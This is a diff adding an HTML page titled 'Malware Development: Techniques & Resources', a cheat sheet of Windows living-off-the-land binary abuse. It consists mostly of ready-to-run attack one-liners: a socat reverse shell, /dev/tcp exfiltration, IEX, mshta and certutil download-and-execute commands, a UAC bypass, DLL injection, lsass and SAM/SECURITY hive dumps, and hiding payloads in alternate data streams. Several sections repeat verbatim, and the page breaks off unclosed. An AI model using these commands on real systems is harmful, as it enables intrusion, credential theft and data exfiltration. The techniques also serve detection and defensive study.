@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lolbins Documentation</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* Custom Scrollbar for code blocks */
+    pre, code {
+      display: block;
+      overflow-x: auto;
+    }
+    pre {
+      padding: 16px;
+      background: #1e293b; /* dark bg for code block */
+      border-radius: 8px;
+    }
+    code {
+      font-size: 0.9rem;
+      color: #fbbf24;
+    }
+    /* You can customize the colors of syntax highlighting if using a plugin */
+  </style>
+</head>
+<body class="bg-white dark:bg-zinc-900 text-zinc-800 dark:text-zinc-100">
+  <div class="flex h-screen">
+    <!-- Sidebar -->
+    <aside class="w-64 bg-white dark:bg-zinc-900 border-r border-zinc-200 dark:border-zinc-700 p-4 space-y-4 text-sm">
+      <h2 class="text-xs font-semibold uppercase tracking-wide text-zinc-500 dark:text-zinc-400">Malware Development</h2>
+
+      <!-- Collapsible Table of Contents -->
+      <details class="group" open>
+        <summary class="cursor-pointer flex items-center justify-between py-2 px-3 rounded hover:bg-zinc-100 dark:hover:bg-zinc-800 transition">
+          <span class="font-medium">LOLbins and Exploitation</span>
+          <svg class="w-4 h-4 text-zinc-500 group-open:rotate-90 transform transition-transform duration-200"
+               xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
+          </svg>
+        </summary>
+        <div class="pl-4 mt-1 space-y-1">
+          <a href="#pester" class="block text-blue-600 hover:text-blue-800">Pester</a>
+          <a href="#wmi-process" class="block text-blue-600 hover:text-blue-800">Lateral Movement via WMI Win32_Process</a>
+          <a href="#wmi-service" class="block text-blue-600 hover:text-blue-800">Lateral Movement via WMI Win32_Service</a>
+          <a href="#awl" class="block text-blue-600 hover:text-blue-800">AWL Bypass (WMI)</a>
+          <a href="#proxy-exec" class="block text-blue-600 hover:text-blue-800">Proxy Execution Managed DLL</a>
+          <a href="#powershell-injection" class="block text-blue-600 hover:text-blue-800">PowerShell Injection</a>
+          <a href="#scheduled-tasks" class="block text-blue-600 hover:text-blue-800">Scheduled Tasks</a>
+          <a href="#bash" class="block text-blue-600 hover:text-blue-800">Bash.exe</a>
+          <a href="#ads" class="block text-blue-600 hover:text-blue-800">Alternate Data Streams (ADS)</a>
+          <a href="#uac-bypass" class="block text-blue-600 hover:text-blue-800">UAC Bypass with ComputerDefaults</a>
+          <a href="#appinstaller" class="block text-blue-600 hover:text-blue-800">AppInstaller Exploits</a>
+          <a href="#mshta" class="block text-blue-600 hover:text-blue-800">Edge and mshta.exe Exploits</a>
+          <a href="#ngen" class="block text-blue-600 hover:text-blue-800">Fileless Techniques with Ngen</a>
+          <a href="#pktmon" class="block text-blue-600 hover:text-blue-800">Reconnaissance with PktMon</a>
+          <a href="#process-injection" class="block text-blue-600 hover:text-blue-800">Process Injection and Memory Dumps</a>
+        </div>
+      </details>
+
+      <!-- Theme Toggle Buttons -->
+      <div class="flex justify-around pt-4 border-t border-zinc-200 dark:border-zinc-700">
+        <button onclick="setTheme('light')" class="text-xs px-2 py-1 rounded bg-zinc-100 dark:bg-zinc-700 hover:bg-zinc-200 dark:hover:bg-zinc-600">
+          ☀️ Light
+        </button>
+        <button onclick="setTheme('dark')" class="text-xs px-2 py-1 rounded bg-zinc-100 dark:bg-zinc-700 hover:bg-zinc-200 dark:hover:bg-zinc-600">
+          🌑 Dark
+        </button>
+        <button onclick="setTheme('system')" class="text-xs px-2 py-1 rounded bg-zinc-100 dark:bg-zinc-700 hover:bg-zinc-200 dark:hover:bg-zinc-600">
+          🖥️ System
+        </button>
+      </div>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main class="flex-1 p-8 overflow-auto">
+      <h1 class="text-3xl font-semibold">Malware Development: Techniques & Resources</h1>
+      <p class="mt-4">Welcome to the collection of LOLbins and exploitation techniques. Learn how to use these tools for lateral movement, remote code execution, and bypassing security mechanisms.</p>
+
+      <!-- Disclaimer -->
+      <div class="mt-8">
+        <p class="mx-auto w-full max-w-3xl text-neutral-strong links-default:[&_a]:text-danger links-default:[&_a:hover]:text-danger-strong links-default:[&_a]:decoration-danger/6 links-accent:[&_a]:decoration-danger decoration-danger/6 [&_.can-override-bg]:bg-danger-active [&_.can-override-text]:text-danger-strong flip-heading-hash">
+          <span class="bg-mark-orange">The information you gather from this blog, all the techniques, proofs-of-concept code, or whatever else you may possibly find here, are </span>
+          <i class="font-italic"><span class="bg-mark-orange">strictly </span></i><span class="bg-mark-orange">for educational purposes</span>.
+          I do not condone the usage of anything you might gather from this blog or my videos for malicious purposes. I've made this blog and the YouTube videos therein, to consolidate my learning by 
+          <button data-testid="annotation-button" aria-label="Open annotation" class="decoration-dotted decoration-1 underline underline-offset-2" type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-:r16:" data-state="closed">teaching it</button> to the world.
+        </p>
+      </div>
+
+      <!-- Example Section: Pester -->
+      <section id="pester" class="mt-8">
+        <h2 class="text-2xl font-semibold">Pester</h2>
+        <p class="mt-2">Pester.bat can be used to execute arbitrary code with the specified payload.</p>
+        <h3 class="mt-6 font-semibold">Code Example</h3>
+        <pre><code class="language-bash">Pester.bat "$null; cmd /c c:\windows\system32\calc.exe"</code></pre>
+      </section>
+
+      <!-- Example Section: Lateral Movement via WMI Win32_Process -->
+      <section id="wmi-process" class="mt-8">
+        <h2 class="text-2xl font-semibold">Lateral Movement via WMI Win32_Process</h2>
+        <p class="mt-2">WMI (Windows Management Instrumentation) can be used for remote command execution via the Win32_Process class over the WinRM protocol.</p>
+        <h3 class="mt-6 font-semibold">Code Example</h3>
+        <pre><code class="language-bash">winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd /c c:\windows\system32\calc.exe"} -r:http://target:5985</code></pre>
+      </section>
+
+      <!-- Example Section: Lateral Movement via WMI Win32_Service -->
+      <section id="wmi-service" class="mt-8">
+        <h2 class="text-2xl font-semibold">Lateral Movement via WMI Win32_Service</h2>
+        <p class="mt-2">This method allows lateral movement via WMI, invoking a service that executes a command remotely.</p>
+        <h3 class="mt-6 font-semibold">Code Example</h3>
+        <pre><code class="language-bash">winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd /c c:\windows\system32\calc.exe"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985</code></pre>
+      </section>
+
+      <!-- More Sections for other LOLbins like AWL Bypass, Proxy Execution, etc. -->
+
+     <div class="mt-8">
+        <h2 id="awl" class="text-2xl font-semibold">AWL Bypass</h2>
+        <p class="mt-2">Bypass AWL solutions by copying <code>cscript.exe</code> to an attacker-controlled location; creating a malicious <code>WsmPty.xsl</code> in the same location, and executing <code>winrm.vbs</code> via the relocated <code>cscript.exe</code>.</p>
+        <h3 class="mt-6 font-semibold">Code Example</h3>
+        <pre><code class="language-bash">%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty</code></pre>
+      </div>
+
+      <div class="mt-8">
+        <h2 id="proxy-exec" class="text-2xl font-semibold">Proxy Execute Managed DLL with PowerShell</h2>
+        <p class="mt-2">Execute proxied payload with Microsoft signed binary via PowerShell</p>
+        <h3 class="mt-6 font-semibold">Code Example</h3>
+        <pre><code class="language-bash">powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"</code></pre>
+      </div>
+
+      <div class="mt-8">
+        <h2 id="powershell-injection" class="text-2xl font-semibold">PowerShell Injection</h2>
+        <p class="mt-2">Inject PowerShell script code with the provided arguments to execute malicious payloads.</p>
+        <h3 class="mt-6 font-semibold">Code Example</h3>
+        <pre><code class="language-bash">SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('https://www.example.org/file.ps1') | IEX"</code></pre>
+        <h3 class="mt-6 font-semibold">Windows Script Host (WSH) Injection</h3>
+        <pre><code class="language-bash">pubprn.vbs 127.0.0.1 script:https://www.example.org/file.sct</code></pre>
+      </div>
+
+      <div class="mt-8">
+        <h2 class="text-2xl font-semibold">AppInstaller Exploits</h2>
+        <p class="mt-2">AppInstaller.exe is spawned by the default handler for the URI, attempting to load/install a package from a remote URL.</p>
+        <h3 class="mt-6 font-semibold">Code Example</h3>
+        <pre><code class="language-bash">start ms-appinstaller://?source=https://www.example.org/file.exe</code></pre>
+      </div>
+
+      <div class="mt-8">
+        <h2 id="bash" class="text-2xl font-semibold">Bash.exe</h2>
+        <p class="mt-2">File used by Windows Subsystem for Linux (WSL) to execute commands.</p>
+        <h3 class="mt-6 font-semibold">Code Examples</h3>
+        <pre><code class="language-bash">bash.exe -c "cmd /c c:\windows\system32\calc.exe"</code></pre>
+        <pre><code class="language-bash">bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"</code></pre>
+        <pre><code class="language-bash">bash.exe -c 'cat file.zip > /dev/tcp/192.168.1.10/24'</code></pre>
+      </div>
+
+      <div class="mt-8">
+        <h2 id="ads" class="text-2xl font-semibold">Alternate Data Streams (ADS)</h2>
+        <p class="mt-2">Use ADS for data exfiltration, encoding, or storing malicious files.</p>
+        <h3 class="mt-6 font-semibold">Code Examples</h3>
+        <pre><code class="language-bash">certutil.exe -urlcache -split -f https://www.example.org/file.ps1 C:\Windows\Temp\file.ext:ttt</code></pre>
+        <pre><code class="language-bash">certutil -encode file.ext file.base64</code></pre>
+        <pre><code class="language-bash">certutil -decode file.base64 file.ext</code></pre>
+      </div>
+
+      <div class="mt-8">
+        <h2 id="uac-bypass" class="text-2xl font-semibold">UAC Bypass with ComputerDefaults</h2>
+        <p class="mt-2">Bypassing User Account Control (UAC) using <code>ComputerDefaults.exe</code> by modifying specific registry values.</p>
+        <h3 class="mt-6 font-semibold">Code Example</h3>
+        <pre><code class="language-bash">ComputerDefaults.exe</code></pre>
+      </div>
+
+      <div class="mt-8">
+        <h2 id="mshta" class="text-2xl font-semibold">Edge and mshta.exe Exploits</h2>
+        <p class="mt-2">Use <code>mshta.exe</code> to execute JavaScript, VBScript, or HTA files directly.</p>
+        <h3 class="mt-6 font-semibold">Code Example</h3>
+        <pre><code class="language-bash">mshta.exe vbscript:Close(Execute("GetObject(""script:https://www.example.org/file.sct"")"))</code></pre>
+      </div>
+
+      <div class="mt-8">
+        <h2 id="pktmon" class="text-2xl font-semibold">Reconnaissance with PktMon</h2>
+        <p class="mt-2">PktMon can be used for network reconnaissance and packet capture in Windows environments.</p>
+        <h3 class="mt-6 font-semibold">Code Example</h3>
+        <pre><code class="language-bash">pktmon.exe start --etw</code></pre>
+      </div>
+
+      <div class="mt-8">
+        <h2 id="process-injection" class="text-2xl font-semibold">Process Injection and Memory Dumps</h2>
+        <p class="mt-2">Inject malicious DLLs or dump memory from critical processes such as <code>lsass.exe</code> to extract sensitive data.</p>
+        <h3 class="mt-6 font-semibold">Code Example</h3>
+        <pre><code class="language-bash">adplus.exe -hang -pn lsass.exe -o C:\Windows\Temp\folder -quiet</code></pre>
+      </div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Proxy Execute Managed DLL with PowerShell</h2>
+  <p class="mt-2">Execute proxied payload with a Microsoft signed binary via PowerShell.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
+  </code></pre>
+  <h3 class="mt-6 font-semibold">Use Case</h3>
+  <p class="mt-2">Execute proxied payload using a Microsoft signed binary.</p>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">PowerShell Script Injection</h2>
+  <p class="mt-2">Inject PowerShell script code with the provided arguments to execute malicious payloads.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('https://www.example.org/file.ps1') | IEX"
+  </code></pre>
+  <h3 class="mt-6 font-semibold">Set the 2nd Variable for WSH Injection</h3>
+  <pre><code class="language-bash">
+pubprn.vbs 127.0.0.1 script:https://www.example.org/file.sct
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">PowerShell Diagnostic CL_Invocation Script</h2>
+  <p class="mt-2">Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1
+SyncInvoke cmd /c c:\windows\system32\calc.exe
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">PowerShell Diagnostic CL_Mutexverifiers Script</h2>
+  <p class="mt-2">Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1
+runAfterCancelProcess file.ps1
+  </code></pre>
+  <h3 class="mt-6 font-semibold">Use Case</h3>
+  <p class="mt-2">Proxy execution with a mutex-based process cancellation mechanism.</p>
+</div>
+
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">AppInstaller Exploit</h2>
+  <p class="mt-2">AppInstaller.exe is spawned by the default handler for the URI. It attempts to load and install a package from the URL and is saved in the INetCache.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+start ms-appinstaller://?source=https://www.example.org/file.exe
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Recurring Task Execution</h2>
+  <p class="mt-2">Create a recurring task to execute every day at a specific time.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su cmd /c c:\windows\system32\calc.exe
+  </code></pre>
+</div>
+
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Bash.exe Execution</h2>
+  <p class="mt-2">File used by Windows Subsystem for Linux (WSL) to execute commands on Windows systems.</p>
+  <h3 class="mt-6 font-semibold">Execute Command via Bash</h3>
+  <pre><code class="language-bash">
+bash.exe -c "cmd /c c:\windows\system32\calc.exe"
+  </code></pre>
+
+  <h3 class="mt-6 font-semibold">Reverse Shell Execution</h3>
+  <pre><code class="language-bash">
+bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
+  </code></pre>
+
+  <h3 class="mt-6 font-semibold">Exfiltrate Data via Bash</h3>
+  <pre><code class="language-bash">
+bash.exe -c 'cat file.zip > /dev/tcp/192.168.1.10/24'
+  </code></pre>
+
+  <h3 class="mt-6 font-semibold">AWL Bypass Example</h3>
+  <pre><code class="language-bash">
+bash.exe -c "cmd /c c:\windows\system32\calc.exe"
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Bash.exe Execution</h2>
+  <p class="mt-2">File used by Windows Subsystem for Linux (WSL) to execute commands on Windows systems.</p>
+  <h3 class="mt-6 font-semibold">Execute Command via Bash</h3>
+  <pre><code class="language-bash">
+bash.exe -c "cmd /c c:\windows\system32\calc.exe"
+  </code></pre>
+
+  <h3 class="mt-6 font-semibold">Reverse Shell Execution</h3>
+  <pre><code class="language-bash">
+bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
+  </code></pre>
+
+  <h3 class="mt-6 font-semibold">Exfiltrate Data via Bash</h3>
+  <pre><code class="language-bash">
+bash.exe -c 'cat file.zip > /dev/tcp/192.168.1.10/24'
+  </code></pre>
+
+  <h3 class="mt-6 font-semibold">AWL Bypass Example</h3>
+  <pre><code class="language-bash">
+bash.exe -c "cmd /c c:\windows\system32\calc.exe"
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Alternate Data Streams (ADS)</h2>
+  <p class="mt-2">Download and save a PS1 file to an Alternate Data Stream (ADS).</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+certutil.exe -urlcache -split -f https://www.example.org/file.ps1 C:\Windows\Temp\file.ext:ttt
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Alternate Data Streams (ADS) - Download and Save a PS1 File</h2>
+  <p class="mt-2">Download and save a PowerShell script (PS1) file to an Alternate Data Stream (ADS) for stealthy execution.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+certutil.exe -urlcache -split -f https://www.example.org/file.ps1 C:\Windows\Temp\file.ext:ttt
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Encode a File Using Base64</h2>
+  <p class="mt-2">Command to encode a file using Base64 encoding, commonly used for hiding malicious payloads.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+certutil -encode file.ext file.base64
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Decode a Base64 Encoded File</h2>
+  <p class="mt-2">Command to decode a Base64-encoded file back to its original form.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+certutil -decode file.base64 file.ext
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Decode a Hexadecimal-Encoded File</h2>
+  <p class="mt-2">Command to decode a file that has been hexadecimal-encoded.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+certutil -decodehex file.hex file.ext
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Alternate Data Streams (ADS) - Add Content to an ADS</h2>
+  <p class="mt-2">Add content to an Alternate Data Stream (ADS), which can be executed via the command line.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://www.example.org/file.sct ^scrobj.dll > file.ext:payload.bat
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Execute Payload Stored in an Alternate Data Stream (ADS)</h2>
+  <p class="mt-2">Execute a payload (e.g., `payload.bat`) stored in an Alternate Data Stream (ADS) using `cmd.exe`.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+cmd.exe - < file.ext:payload.bat
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">List Cached Credentials</h2>
+  <p class="mt-2">Command to list cached credentials from the system, useful for credential dumping or lateral movement.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+cmdkey /list
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">UAC Bypass Using ComputerDefaults.exe</h2>
+  <p class="mt-2">The ComputerDefaults.exe utility can be abused for UAC bypass if certain registry values are set. This allows an attacker to execute a command as a high-integrity process without triggering a UAC prompt.</p>
+  <h3 class="mt-6 font-semibold">Registry Keys/Values to Set</h3>
+  <p class="mt-2">The attacker needs to set two specific registry keys located at:</p>
+  <pre><code class="language-bash">
+HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\open\command
+  </code></pre>
+  <p class="mt-2">When set correctly, these keys can be leveraged by `ComputerDefaults.exe` to execute commands as a high-integrity process without UAC confirmation.</p>
+  <h3 class="mt-6 font-semibold">Paths for ComputerDefaults.exe</h3>
+  <pre><code class="language-bash">
+C:\Windows\System32\ComputerDefaults.exe
+C:\Windows\SysWOW64\ComputerDefaults.exe
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Execute evil.dll Stored in an Alternate Data Stream (ADS)</h2>
+  <p class="mt-2">Execute a malicious DLL file stored in an Alternate Data Stream (ADS), allowing it to remain hidden within a seemingly innocent file.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+control.exe C:\Windows\Temp\file.ext:evil.dll
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Upload File, Credentials, or Data Exfiltration</h2>
+  <p class="mt-2">Upload a file or data to an external server. This command attempts to exfiltrate data, though it may be blocked depending on the environment.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+DataSvcUtil /out:C:\Windows\Temp\file.ext /uri:https://www.example.org/file.ext
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Download File and Set as Lock Screen</h2>
+  <p class="mt-2">Download a file and set it as the system's lock screen. This technique can be used to trick the user or hide an exfiltrated file.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://www.example.org/file.ext /eventName:desktopimgdownldr
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Search for Stored Passwords in Group Policy Files on SYSVOL</h2>
+  <p class="mt-2">Search for stored credentials (e.g., passwords) in Group Policy files located on the SYSVOL share.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+findstr /S /I cpassword \\sysvol\policies\*.xml
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Inject evil.dll into a Process with PID 3110</h2>
+  <p class="mt-2">Inject a malicious DLL into a running process (PID 3110). This allows code execution in the context of the target process.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+MavInject.exe 3110 /INJECTRUNNING C:\Windows\Temp\file.dll
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Download File to Specified Path</h2>
+  <p class="mt-2">Download a file to a specified path using `MpCmdRun.exe` and store it in a folder, such as the system's temp folder or public directory.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+MpCmdRun.exe -DownloadFile -url https://www.example.org/file.exe -path C:\Windows\Temp\file.exe
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Download File to Specified Path (Bypass Windows 10 Mitigation)</h2>
+  <p class="mt-2">Bypass mitigation strategies in Windows 10 by copying the necessary executable and using a specific version of `MpCmdRun.exe`.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url https://www.example.org/file.exe -path C:\Users\Public\Downloads\evil.exe
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Download File to Machine and Store It in an Alternate Data Stream (ADS)</h2>
+  <p class="mt-2">Download a file and store it in an Alternate Data Stream (ADS) to avoid detection by traditional scanning methods.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+MpCmdRun.exe -DownloadFile -url https://www.example.org/file.exe -path C:\Windows\Temp\file.exe:evil.exe
+  </code></pre>
+</div>
+
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Download File Using Microsoft Edge with a Harmless File Extension</h2>
+  <p class="mt-2">Use Microsoft Edge to download a file and append a harmless file extension (e.g., `.txt` or `.zip`) to bypass detection mechanisms like SmartScreen.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+msedge.exe https://www.example.org/file.exe.txt
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Download File Silently Using Edge and Base64 Encoding</h2>
+  <p class="mt-2">Use Microsoft Edge to silently download a Base64-encoded file. This technique requires encoding the file in Base64 and embedding it in an HTML document.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+msedge.exe --headless --enable-logging --disable-gpu --dump-dom "https://www.example.org/file.base64.html" > file.b64
+  </code></pre>
+</div>
+
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Execute Command via Microsoft Edge</h2>
+  <p class="mt-2">Launch Microsoft Edge with the `--disable-gpu-sandbox` option and execute a command in the context of a spawned `cmd.exe` process.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+msedge.exe --disable-gpu-sandbox --gpu-launcher="cmd /c c:\windows\system32\calc.exe &&"
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Execute .HTA and Embedded Scripts</h2>
+  <p class="mt-2">Open and execute a target .HTA file, which may contain embedded JavaScript, JScript, or VBScript for malicious purposes.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+mshta.exe file.hta
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Execute VBScript as Command Line Argument</h2>
+  <p class="mt-2">Execute a VBScript supplied directly as a command-line argument using mshta.exe.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+mshta.exe vbscript:Close(Execute("GetObject(""script:https://www.example.org/file.sct"")"))
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Execute JavaScript as Command Line Argument</h2>
+  <p class="mt-2">Execute JavaScript supplied directly as a command-line argument using mshta.exe.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+mshta.exe javascript:a=GetObject("script:https://www.example.org/file.sct").Exec();close();
+  </code></pre>
+</div>
+
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Open .HTA from Alternate Data Stream (ADS)</h2>
+  <p class="mt-2">Open and execute an HTA file stored in an Alternate Data Stream (ADS) on the system.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+mshta.exe "C:\Windows\Temp\file.ext:file.hta"
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Download Remote Payload with `mshta.exe`</h2>
+  <p class="mt-2">Use mshta.exe to download a remote payload from a specified URL and execute it.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+mshta.exe https://www.example.org/file.ext
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Download Payload Using `ngen.exe`</h2>
+  <p class="mt-2">Download a payload from a remote server using the Microsoft Native Image Generator (`ngen.exe`).</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+ngen.exe https://www.example.org/file.ext
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Start Packet Capture with `pktmon.exe`</h2>
+  <p class="mt-2">Start a packet capture with `pktmon.exe`, which can capture network traffic for reconnaissance purposes.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+pktmon.exe start --etw
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Filter for Specific Ports with `pktmon.exe`</h2>
+  <p class="mt-2">Filter the packet capture to focus on specific network ports, such as port 445.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+pktmon.exe filter add -p 445
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Extract ZIP File from Alternate Data Stream (ADS) with `PrintBrm`</h2>
+  <p class="mt-2">Extract a ZIP file stored in an Alternate Data Stream (ADS) to a specified folder.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+PrintBrm -r -f C:\Windows\Temp\file.ext:hidden.zip -d C:\Windows\Temp\folder
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Record User Screen with `psr.exe`</h2>
+  <p class="mt-2">Use the built-in `psr.exe` (Problem Steps Recorder) to record a user's screen activity.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+psr.exe /start /output C:\Windows\Temp\file.zip /sc 1 /gui 0
+  </code></pre>
+</div>
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Dump Registry Hives for Password Hashes</h2>
+  <p class="mt-2">Dump the registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and other key material.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+reg save HKLM\SECURITY C:\Windows\Temp\file.1.bak && reg save HKLM\SYSTEM C:\Windows\Temp\file.2.bak && reg save HKLM\SAM C:\Windows\Temp\file.3.bak
+  </code></pre>
+</div>
+
+<div class="mt-8">
+  <h2 class="text-2xl font-semibold">Execute PowerShell Script with `.txt` Extension</h2>
+  <p class="mt-2">Execute a PowerShell script with a `.txt` file extension using `runscripthelper.exe`.</p>
+  <h3 class="mt-6 font-semibold">Code Example</h3>
+  <pre><code class="language-bash">
+runscripthelper.exe surfacecheck \\?\C:\Windows\Temp\file.txt C:\Windows\Temp\folder
